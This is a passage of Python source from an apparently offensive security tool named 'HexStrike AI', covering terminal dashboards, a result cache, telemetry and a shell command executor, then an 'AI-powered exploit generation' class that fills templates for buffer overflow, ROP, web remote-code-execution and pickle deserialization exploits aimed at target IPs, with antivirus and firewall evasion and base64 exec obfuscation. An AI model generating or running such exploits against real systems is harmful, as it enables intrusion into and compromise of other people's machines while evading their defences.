        severity = vuln_data.get('severity', 'info').lower()
        title = vuln_data.get('title', 'Unknown Vulnerability')
        url = vuln_data.get('url', 'N/A')
        description = vuln_data.get('description', 'No description available')
        cvss = vuln_data.get('cvss_score', 0.0)
        
        # Get severity color
        severity_color = ModernVisualEngine.COLORS['HACKER_RED'] if severity == 'critical' else ModernVisualEngine.COLORS['HACKER_RED'] if severity == 'high' else ModernVisualEngine.COLORS['CYBER_ORANGE'] if severity == 'medium' else ModernVisualEngine.COLORS['CYBER_ORANGE'] if severity == 'low' else ModernVisualEngine.COLORS['NEON_BLUE']
        
        # Severity indicators
        severity_indicators = {
            'critical': '🔥 CRITICAL',
            'high': '⚠️  HIGH',
            'medium': '📊 MEDIUM', 
            'low': '📝 LOW',
            'info': 'ℹ️  INFO'
        }
        
        severity_badge = severity_indicators.get(severity, '❓ UNKNOWN')
        
        # Create the vulnerability card
        card = f"""
{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {severity_color}{severity_badge}{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['BOLD']}{title[:60]}{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🎯 Target:{ModernVisualEngine.COLORS['RESET']} {url[:65]}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}📊 CVSS:{ModernVisualEngine.COLORS['RESET']} {cvss}/10.0
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}📋 Description:{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']}   {description[:70]}
{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""
        return card
    
    @staticmethod
    def create_live_dashboard(processes: Dict[int, Dict[str, Any]]) -> str:
        """Create a live dashboard showing all active processes"""
        
        if not processes:
            return f"{ModernVisualEngine.COLORS['TERMINAL_GRAY']}📊 No active processes{ModernVisualEngine.COLORS['RESET']}"
        
        dashboard = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╔══════════════════════════════════════════════════════════════════════════════╗
║                           🚀 LIVE PROCESS DASHBOARD                          ║
╠══════════════════════════════════════════════════════════════════════════════╣{ModernVisualEngine.COLORS['RESET']}
"""
        
        for pid, proc_info in processes.items():
            command = proc_info.get('command', 'Unknown')[:50]
            status = proc_info.get('status', 'unknown')
            progress = proc_info.get('progress', 0.0)
            runtime = proc_info.get('runtime', 0)
            eta = proc_info.get('eta', 0)
            
            # Status color coding
            status_colors = {
                'running': ModernVisualEngine.COLORS['MATRIX_GREEN'],
                'paused': ModernVisualEngine.COLORS['WARNING'],
                'terminated': ModernVisualEngine.COLORS['ERROR'],
                'completed': ModernVisualEngine.COLORS['NEON_BLUE']
            }
            status_color = status_colors.get(status, ModernVisualEngine.COLORS['BRIGHT_WHITE'])
            
            # Create mini progress bar
            mini_bar = ModernVisualEngine.render_progress_bar(
                progress, width=20, style='cyber', eta=eta
            )
            
            dashboard += f"""{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}PID {pid}{ModernVisualEngine.COLORS['RESET']} │ {status_color}{status.upper()}{ModernVisualEngine.COLORS['RESET']} │ {runtime:.1f}s │ {command}...
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {mini_bar}
{ModernVisualEngine.COLORS['BOLD']}╠──────────────────────────────────────────────────────────────────────────────╣{ModernVisualEngine.COLORS['RESET']}
"""
        
        dashboard += f"{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╚══════════════════════════════════════════════════════════════════════════════╝{ModernVisualEngine.COLORS['RESET']}"
        
        return dashboard
    
    @staticmethod
    def format_tool_output(tool: str, output: str, success: bool = True) -> str:
        """Format tool output with syntax highlighting and structure"""
        
        # Get tool icon
        tool_icon = '🛠️'  # Default tool icon
        
        # Status indicator
        status_icon = "✅" if success else "❌"
        status_color = ModernVisualEngine.COLORS['MATRIX_GREEN'] if success else ModernVisualEngine.COLORS['HACKER_RED']
        
        # Format the output with structure
        formatted_output = f"""
{ModernVisualEngine.COLORS['BOLD']}╭─ {tool_icon} {tool.upper()} OUTPUT ─────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color}{status_icon} Status: {'SUCCESS' if success else 'FAILED'}{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
"""
        
        # Process output lines with syntax highlighting
        lines = output.split('\n')
        for line in lines[:20]:  # Limit to first 20 lines for readability
            if line.strip():
                # Basic syntax highlighting
                if any(keyword in line.lower() for keyword in ['error', 'failed', 'denied']):
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ERROR']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
                elif any(keyword in line.lower() for keyword in ['found', 'discovered', 'vulnerable']):
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['MATRIX_GREEN']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
                elif any(keyword in line.lower() for keyword in ['warning', 'timeout']):
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
                else:
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['BRIGHT_WHITE']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
        
        if len(lines) > 20:
            formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['TERMINAL_GRAY']}... ({len(lines) - 20} more lines truncated){ModernVisualEngine.COLORS['RESET']}\n"
        
        formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}"
        
        return formatted_output
    
    @staticmethod
    def create_summary_report(results: Dict[str, Any]) -> str:
        """Generate a beautiful summary report"""
        
        total_vulns = len(results.get('vulnerabilities', []))
        critical_vulns = len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'critical'])
        high_vulns = len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'high'])
        execution_time = results.get('execution_time', 0)
        tools_used = results.get('tools_used', [])
        
        report = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╔══════════════════════════════════════════════════════════════════════════════╗
║                              📊 SCAN SUMMARY REPORT                          ║
╠══════════════════════════════════════════════════════════════════════════════╣{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🎯 Target:{ModernVisualEngine.COLORS['RESET']} {results.get('target', 'Unknown')[:60]}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}⏱️  Duration:{ModernVisualEngine.COLORS['RESET']} {execution_time:.2f} seconds
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}🛠️  Tools Used:{ModernVisualEngine.COLORS['RESET']} {len(tools_used)} tools
{ModernVisualEngine.COLORS['BOLD']}╠──────────────────────────────────────────────────────────────────────────────╣{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['HACKER_RED']}🔥 Critical:{ModernVisualEngine.COLORS['RESET']} {critical_vulns} vulnerabilities
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ERROR']}⚠️  High:{ModernVisualEngine.COLORS['RESET']} {high_vulns} vulnerabilities  
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['MATRIX_GREEN']}📈 Total Found:{ModernVisualEngine.COLORS['RESET']} {total_vulns} vulnerabilities
{ModernVisualEngine.COLORS['BOLD']}╠──────────────────────────────────────────────────────────────────────────────╣{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}🚀 Tools:{ModernVisualEngine.COLORS['RESET']} {', '.join(tools_used[:5])}{'...' if len(tools_used) > 5 else ''}
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╚══════════════════════════════════════════════════════════════════════════════╝{ModernVisualEngine.COLORS['RESET']}
"""
        return report

# Configure enhanced logging with colors
class ColoredFormatter(logging.Formatter):
    """Custom formatter with colors and emojis"""
    
    COLORS = {
        'DEBUG': ModernVisualEngine.COLORS['DEBUG'],
        'INFO': ModernVisualEngine.COLORS['SUCCESS'],
        'WARNING': ModernVisualEngine.COLORS['WARNING'],
        'ERROR': ModernVisualEngine.COLORS['ERROR'],
        'CRITICAL': ModernVisualEngine.COLORS['CRITICAL']
    }
    
    EMOJIS = {
        'DEBUG': '🔍',
        'INFO': '✅',
        'WARNING': '⚠️',
        'ERROR': '❌',
        'CRITICAL': '🔥'
    }
    
    def format(self, record):
        emoji = self.EMOJIS.get(record.levelname, '📝')
        color = self.COLORS.get(record.levelname, ModernVisualEngine.COLORS['BRIGHT_WHITE'])
        
        # Add color and emoji to the message
        record.msg = f"{color}{emoji} {record.msg}{ModernVisualEngine.COLORS['RESET']}"
        return super().format(record)

# Enhanced logging setup
def setup_logging():
    """Setup enhanced logging with colors and formatting"""
    logger = logging.getLogger()
    logger.setLevel(logging.INFO)
    
    # Clear existing handlers
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)
    
    # Console handler with colors
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setFormatter(ColoredFormatter(
        "[🔥 HexStrike AI] %(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S"
    ))
    logger.addHandler(console_handler)
    
    return logger

# Configuration (using existing API_PORT from top of file)
DEBUG_MODE = os.environ.get("DEBUG_MODE", "0").lower() in ("1", "true", "yes", "y")
COMMAND_TIMEOUT = 300  # 5 minutes default timeout
CACHE_SIZE = 1000
CACHE_TTL = 3600  # 1 hour

class HexStrikeCache:
    """Advanced caching system for command results"""
    
    def __init__(self, max_size: int = CACHE_SIZE, ttl: int = CACHE_TTL):
        self.cache = OrderedDict()
        self.max_size = max_size
        self.ttl = ttl
        self.stats = {"hits": 0, "misses": 0, "evictions": 0}
        
    def _generate_key(self, command: str, params: Dict[str, Any]) -> str:
        """Generate cache key from command and parameters"""
        key_data = f"{command}:{json.dumps(params, sort_keys=True)}"
        return hashlib.md5(key_data.encode()).hexdigest()
    
    def _is_expired(self, timestamp: float) -> bool:
        """Check if cache entry is expired"""
        return time.time() - timestamp > self.ttl
    
    def get(self, command: str, params: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Get cached result if available and not expired"""
        key = self._generate_key(command, params)
        
        if key in self.cache:
            timestamp, data = self.cache[key]
            if not self._is_expired(timestamp):
                # Move to end (most recently used)
                self.cache.move_to_end(key)
                self.stats["hits"] += 1
                logger.info(f"💾 Cache HIT for command: {command}")
                return data
            else:
                # Remove expired entry
                del self.cache[key]
        
        self.stats["misses"] += 1
        logger.info(f"🔍 Cache MISS for command: {command}")
        return None
    
    def set(self, command: str, params: Dict[str, Any], result: Dict[str, Any]):
        """Store result in cache"""
        key = self._generate_key(command, params)
        
        # Remove oldest entries if cache is full
        while len(self.cache) >= self.max_size:
            oldest_key = next(iter(self.cache))
            del self.cache[oldest_key]
            self.stats["evictions"] += 1
        
        self.cache[key] = (time.time(), result)
        logger.info(f"💾 Cached result for command: {command}")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get cache statistics"""
        total_requests = self.stats["hits"] + self.stats["misses"]
        hit_rate = (self.stats["hits"] / total_requests * 100) if total_requests > 0 else 0
        
        return {
            "size": len(self.cache),
            "max_size": self.max_size,
            "hit_rate": f"{hit_rate:.1f}%",
            "hits": self.stats["hits"],
            "misses": self.stats["misses"],
            "evictions": self.stats["evictions"]
        }

# Global cache instance
cache = HexStrikeCache()

class TelemetryCollector:
    """Collect and manage system telemetry"""
    
    def __init__(self):
        self.stats = {
            "commands_executed": 0,
            "successful_commands": 0,
            "failed_commands": 0,
            "total_execution_time": 0.0,
            "start_time": time.time()
        }
    
    def record_execution(self, success: bool, execution_time: float):
        """Record command execution statistics"""
        self.stats["commands_executed"] += 1
        if success:
            self.stats["successful_commands"] += 1
        else:
            self.stats["failed_commands"] += 1
        self.stats["total_execution_time"] += execution_time
    
    def get_system_metrics(self) -> Dict[str, Any]:
        """Get current system metrics"""
        return {
            "cpu_percent": psutil.cpu_percent(interval=1),
            "memory_percent": psutil.virtual_memory().percent,
            "disk_usage": psutil.disk_usage('/').percent,
            "network_io": psutil.net_io_counters()._asdict() if psutil.net_io_counters() else {}
        }
    
    def get_stats(self) -> Dict[str, Any]:
        """Get telemetry statistics"""
        uptime = time.time() - self.stats["start_time"]
        success_rate = (self.stats["successful_commands"] / self.stats["commands_executed"] * 100) if self.stats["commands_executed"] > 0 else 0
        avg_execution_time = (self.stats["total_execution_time"] / self.stats["commands_executed"]) if self.stats["commands_executed"] > 0 else 0
        
        return {
            "uptime_seconds": uptime,
            "commands_executed": self.stats["commands_executed"],
            "success_rate": f"{success_rate:.1f}%",
            "average_execution_time": f"{avg_execution_time:.2f}s",
            "system_metrics": self.get_system_metrics()
        }

# Global telemetry collector
telemetry = TelemetryCollector()

class EnhancedCommandExecutor:
    """Enhanced command executor with caching, progress tracking, and better output handling"""
    
    def __init__(self, command: str, timeout: int = COMMAND_TIMEOUT):
        self.command = command
        self.timeout = timeout
        self.process = None
        self.stdout_data = ""
        self.stderr_data = ""
        self.stdout_thread = None
        self.stderr_thread = None
        self.return_code = None
        self.timed_out = False
        self.start_time = None
        self.end_time = None
        
    def _read_stdout(self):
        """Thread function to continuously read and display stdout"""
        try:
            for line in iter(self.process.stdout.readline, ''):
                if line:
                    self.stdout_data += line
                    # Real-time output display
                    logger.info(f"📤 STDOUT: {line.strip()}")
        except Exception as e:
            logger.error(f"Error reading stdout: {e}")
    
    def _read_stderr(self):
        """Thread function to continuously read and display stderr"""
        try:
            for line in iter(self.process.stderr.readline, ''):
                if line:
                    self.stderr_data += line
                    # Real-time error output display
                    logger.warning(f"📥 STDERR: {line.strip()}")
        except Exception as e:
            logger.error(f"Error reading stderr: {e}")
    
    def _show_progress(self, duration: float):
        """Show enhanced progress indication for long-running commands"""
        if duration > 2:  # Show progress for commands taking more than 2 seconds
            progress_chars = ModernVisualEngine.PROGRESS_STYLES['dots']
            start = time.time()
            i = 0
            while self.process and self.process.poll() is None:
                elapsed = time.time() - start
                char = progress_chars[i % len(progress_chars)]
                
                # Calculate progress percentage (rough estimate)
                progress_percent = min((elapsed / self.timeout) * 100, 99.9)
                progress_fraction = progress_percent / 100
                
                # Calculate ETA
                eta = 0
                if progress_percent > 5:  # Only show ETA after 5% progress
                    eta = ((elapsed / progress_percent) * 100) - elapsed
                
                # Calculate speed
                bytes_processed = len(self.stdout_data) + len(self.stderr_data)
                speed = f"{bytes_processed/elapsed:.0f} B/s" if elapsed > 0 else "0 B/s"
                
                # Update process manager with progress
                ProcessManager.update_process_progress(
                    self.process.pid,
                    progress_fraction,
                    f"Running for {elapsed:.1f}s",
                    bytes_processed
                )
                
                # Create beautiful progress bar using ModernVisualEngine
                progress_bar = ModernVisualEngine.render_progress_bar(
                    progress_fraction, 
                    width=30, 
                    style='cyber',
                    label=f"⚡ PROGRESS {char}",
                    eta=eta,
                    speed=speed
                )
                
                logger.info(f"{progress_bar} | {elapsed:.1f}s | PID: {self.process.pid}")
                time.sleep(0.8)
                i += 1
                if elapsed > self.timeout:
                    break
    
    def execute(self) -> Dict[str, Any]:
        """Execute the command with enhanced monitoring and output"""
        self.start_time = time.time()
        
        logger.info(f"🚀 EXECUTING: {self.command}")
        logger.info(f"⏱️  TIMEOUT: {self.timeout}s | PID: Starting...")
        
        try:
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            pid = self.process.pid
            logger.info(f"🆔 PROCESS: PID {pid} started")
            
            # Register process with ProcessManager (v5.0 enhancement)
            ProcessManager.register_process(pid, self.command, self.process)
            
            # Start threads to read output continuously
            self.stdout_thread = threading.Thread(target=self._read_stdout)
            self.stderr_thread = threading.Thread(target=self._read_stderr)
            self.stdout_thread.daemon = True
            self.stderr_thread.daemon = True
            self.stdout_thread.start()
            self.stderr_thread.start()
            
            # Start progress tracking in a separate thread
            progress_thread = threading.Thread(target=self._show_progress, args=(self.timeout,))
            progress_thread.daemon = True
            progress_thread.start()
            
            # Wait for the process to complete or timeout
            try:
                self.return_code = self.process.wait(timeout=self.timeout)
                self.end_time = time.time()
                
                # Process completed, join the threads
                self.stdout_thread.join(timeout=1)
                self.stderr_thread.join(timeout=1)
                
                execution_time = self.end_time - self.start_time
                
                # Cleanup process from registry (v5.0 enhancement)
                ProcessManager.cleanup_process(pid)
                
                if self.return_code == 0:
                    logger.info(f"✅ SUCCESS: Command completed | Exit Code: {self.return_code} | Duration: {execution_time:.2f}s")
                    telemetry.record_execution(True, execution_time)
                else:
                    logger.warning(f"⚠️  WARNING: Command completed with errors | Exit Code: {self.return_code} | Duration: {execution_time:.2f}s")
                    telemetry.record_execution(False, execution_time)
                    
            except subprocess.TimeoutExpired:
                self.end_time = time.time()
                execution_time = self.end_time - self.start_time
                
                # Process timed out but we might have partial results
                self.timed_out = True
                logger.warning(f"⏰ TIMEOUT: Command timed out after {self.timeout}s | Terminating PID {self.process.pid}")
                
                # Try to terminate gracefully first
                self.process.terminate()
                try:
                    self.process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    # Force kill if it doesn't terminate
                    logger.error(f"🔪 FORCE KILL: Process {self.process.pid} not responding to termination")
                    self.process.kill()
                
                self.return_code = -1
                telemetry.record_execution(False, execution_time)
            
            # Always consider it a success if we have output, even with timeout
            success = True if self.timed_out and (self.stdout_data or self.stderr_data) else (self.return_code == 0)
            
            # Log enhanced final results with summary using ModernVisualEngine
            output_size = len(self.stdout_data) + len(self.stderr_data)
            execution_time = self.end_time - self.start_time if self.end_time else 0
            
            # Create status summary
            status_icon = "✅" if success else "❌"
            status_color = ModernVisualEngine.COLORS['MATRIX_GREEN'] if success else ModernVisualEngine.COLORS['HACKER_RED']
            timeout_status = f" {ModernVisualEngine.COLORS['WARNING']}[TIMEOUT]{ModernVisualEngine.COLORS['RESET']}" if self.timed_out else ""
            
            # Create beautiful results summary
            results_summary = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color}📊 FINAL RESULTS {status_icon}{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🚀 Command:{ModernVisualEngine.COLORS['RESET']} {self.command[:55]}{'...' if len(self.command) > 55 else ''}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}⏱️  Duration:{ModernVisualEngine.COLORS['RESET']} {execution_time:.2f}s{timeout_status}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}📊 Output Size:{ModernVisualEngine.COLORS['RESET']} {output_size} bytes
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}🔢 Exit Code:{ModernVisualEngine.COLORS['RESET']} {self.return_code}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color}📈 Status:{ModernVisualEngine.COLORS['RESET']} {'SUCCESS' if success else 'FAILED'} | Cached: Yes
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""
            
            # Log the beautiful summary
            for line in results_summary.strip().split('\n'):
                if line.strip():
                    logger.info(line)
            
            return {
                "stdout": self.stdout_data,
                "stderr": self.stderr_data,
                "return_code": self.return_code,
                "success": success,
                "timed_out": self.timed_out,
                "partial_results": self.timed_out and (self.stdout_data or self.stderr_data),
                "execution_time": self.end_time - self.start_time if self.end_time else 0,
                "timestamp": datetime.now().isoformat()
            }
        
        except Exception as e:
            self.end_time = time.time()
            execution_time = self.end_time - self.start_time if self.start_time else 0
            
            logger.error(f"💥 ERROR: Command execution failed: {str(e)}")
            logger.error(f"🔍 TRACEBACK: {traceback.format_exc()}")
            telemetry.record_execution(False, execution_time)
            
            return {
                "stdout": self.stdout_data,
                "stderr": f"Error executing command: {str(e)}\n{self.stderr_data}",
                "return_code": -1,
                "success": False,
                "timed_out": False,
                "partial_results": bool(self.stdout_data or self.stderr_data),
                "execution_time": execution_time,
                "timestamp": datetime.now().isoformat()
            }

# ============================================================================
# DUPLICATE CLASSES REMOVED - Using the first definitions above
# ============================================================================

# ============================================================================
# AI-POWERED EXPLOIT GENERATION SYSTEM (v6.0 ENHANCEMENT)
# ============================================================================
# 
# This section contains advanced AI-powered exploit generation capabilities
# for automated vulnerability exploitation and proof-of-concept development.
# 
# Features:
# - Automated exploit template generation from CVE data
# - Multi-architecture support (x86, x64, ARM)
# - Evasion technique integration
# - Custom payload generation
# - Exploit effectiveness scoring
# 
# ============================================================================



class AIExploitGenerator:
    """AI-powered exploit development and enhancement system"""
    
    def __init__(self):
        # Extend existing payload templates
        self.exploit_templates = {
            "buffer_overflow": {
                "x86": """
# Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x86

import struct
import socket

def create_exploit():
    # Vulnerability details from {cve_id}
    target_ip = "{target_ip}"
    target_port = {target_port}
    
    # Buffer overflow payload
    padding = "A" * {offset}
    eip_control = struct.pack("<I", {ret_address})
    nop_sled = "\\x90" * {nop_size}
    
    # Shellcode ({shellcode_type})
    shellcode = {shellcode}
    
    exploit = padding + eip_control + nop_sled + shellcode
    return exploit

if __name__ == "__main__":
    payload = create_exploit()
    print(f"Exploit payload generated for {cve_id}")
    print(f"Payload size: {{len(payload)}} bytes")
                """,
                "x64": """
# 64-bit Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x64

import struct
import socket

def create_rop_exploit():
    target_ip = "{target_ip}"
    target_port = {target_port}
    
    # ROP chain for x64 exploitation
    padding = "A" * {offset}
    rop_chain = [
        {rop_gadgets}
    ]
    
    rop_payload = "".join([struct.pack("<Q", addr) for addr in rop_chain])
    shellcode = {shellcode}
    
    exploit = padding + rop_payload + shellcode
    return exploit
                """
            },
            "web_rce": """
# Web-based RCE Exploit for {cve_id}
# Target: {target_info}

import requests
import sys

def exploit_rce(target_url, command):
    # CVE {cve_id} exploitation
    headers = {{
        "User-Agent": "Mozilla/5.0 (Compatible Exploit)",
        "Content-Type": "{content_type}"
    }}
    
    # Injection payload
    payload = {injection_payload}
    
    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(f"Exploit failed: {{e}}")
    
    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target_url> <command>")
        sys.exit(1)
    
    result = exploit_rce(sys.argv[1], sys.argv[2])
    if result:
        print("Exploit successful!")
        print(result)
            """,
            "deserialization": """
# Deserialization Exploit for {cve_id}
# Target: {target_info}

import pickle
import base64
import requests

class ExploitPayload:
    def __reduce__(self):
        return (eval, ('{command}',))

def create_malicious_payload(command):
    payload = ExploitPayload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()
    return encoded

def send_exploit(target_url, command):
    payload = create_malicious_payload(command)
    
    data = {{
        "{parameter_name}": payload
    }}
    
    response = requests.post(target_url, data=data)
    return response.text
            """
        }
        
        self.evasion_techniques = {
            "encoding": ["url", "base64", "hex", "unicode"],
            "obfuscation": ["variable_renaming", "string_splitting", "comment_injection"],
            "av_evasion": ["encryption", "packing", "metamorphism"],
            "waf_bypass": ["case_variation", "parameter_pollution", "header_manipulation"]
        }
    
    def generate_exploit_from_cve(self, cve_data, target_info):
        """Generate working exploit from CVE data"""
        try:
            cve_id = cve_data.get("cve_id", "")
            description = cve_data.get("description", "").lower()
            
            # Determine vulnerability type
            vuln_type = self._classify_vulnerability(description)
            exploit_template = self._select_template(vuln_type, target_info)
            
            # Generate exploit parameters
            exploit_params = self._generate_exploit_parameters(cve_data, target_info, vuln_type)
            
            # Fill template with parameters
            exploit_code = exploit_template.format(**exploit_params)
            
            # Apply evasion techniques if requested
            if target_info.get("evasion_level", "none") != "none":
                exploit_code = self._apply_evasion_techniques(exploit_code, target_info)
            
            return {
                "success": True,
                "cve_id": cve_id,
                "vulnerability_type": vuln_type,
                "exploit_code": exploit_code,
                "parameters": exploit_params,
                "instructions": self._generate_usage_instructions(vuln_type, exploit_params),
                "evasion_applied": target_info.get("evasion_level", "none")
            }
            
        except Exception as e:
            logger.error(f"Error generating exploit: {str(e)}")
            return {"success": False, "error": str(e)}
    
    def _classify_vulnerability(self, description):
        """Classify vulnerability type from description"""
        if any(keyword in description for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
            return "buffer_overflow"
        elif any(keyword in description for keyword in ["code execution", "command injection", "rce"]):
            return "web_rce"
        elif any(keyword in description for keyword in ["deserialization", "unserialize", "pickle"]):
            return "deserialization"
        elif any(keyword in description for keyword in ["sql injection", "sqli"]):
            return "sql_injection"
        elif any(keyword in description for keyword in ["xss", "cross-site scripting"]):
            return "xss"
        else:
            return "generic"
    
    def _select_template(self, vuln_type, target_info):
        """Select appropriate exploit template"""
        if vuln_type == "buffer_overflow":
            arch = target_info.get("target_arch", "x86")
            return self.exploit_templates["buffer_overflow"].get(arch,
                   self.exploit_templates["buffer_overflow"]["x86"])
        elif vuln_type in self.exploit_templates:
            return self.exploit_templates[vuln_type]
        else:
            return "# Generic exploit template for {cve_id}\n# Manual development required"
    
    def _generate_exploit_parameters(self, cve_data, target_info, vuln_type):
        """Generate parameters for exploit template"""
        params = {
            "cve_id": cve_data.get("cve_id", ""),
            "target_info": target_info.get("description", "Unknown target"),
            "target_ip": target_info.get("target_ip", "192.168.1.100"),
            "target_port": target_info.get("target_port", 80),
            "command": target_info.get("command", "id"),
        }
        
        if vuln_type == "buffer_overflow":
            params.update({
                "offset": target_info.get("offset", 268),
                "ret_address": target_info.get("ret_address", "0x41414141"),
                "nop_size": target_info.get("nop_size", 16),
                "shellcode": target_info.get("shellcode", '"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"'),
                "shellcode_type": target_info.get("shellcode_type", "linux/x86/exec"),
                "rop_gadgets": target_info.get("rop_gadgets", "0x41414141, 0x42424242")
            })
        elif vuln_type == "web_rce":
            params.update({
                "content_type": target_info.get("content_type", "application/x-www-form-urlencoded"),
                "injection_payload": target_info.get("injection_payload", '{"cmd": command}'),
                "parameter_name": target_info.get("parameter_name", "data")
            })
        
        return params
    
    def _apply_evasion_techniques(self, exploit_code, target_info):
        """Apply evasion techniques to exploit code"""
        evasion_level = target_info.get("evasion_level", "basic")
        
        if evasion_level == "basic":
            # Simple string obfuscation
            exploit_code = exploit_code.replace('"', "'")
            exploit_code = f"# Obfuscated exploit\n{exploit_code}"
        elif evasion_level == "advanced":
            # Advanced obfuscation
            exploit_code = self._advanced_obfuscation(exploit_code)
        
        return exploit_code
    
    def _advanced_obfuscation(self, code):
        """Apply advanced obfuscation techniques"""
        # This is a simplified version - real implementation would be more sophisticated
        obfuscated = f"""
# Advanced evasion techniques applied
import base64
exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
        """
        return obfuscated
    
    def _generate_usage_instructions(self, vuln_type, params):
        """Generate usage instructions for the exploit"""
        instructions = [
            f"# Exploit for CVE {params['cve_id']}",
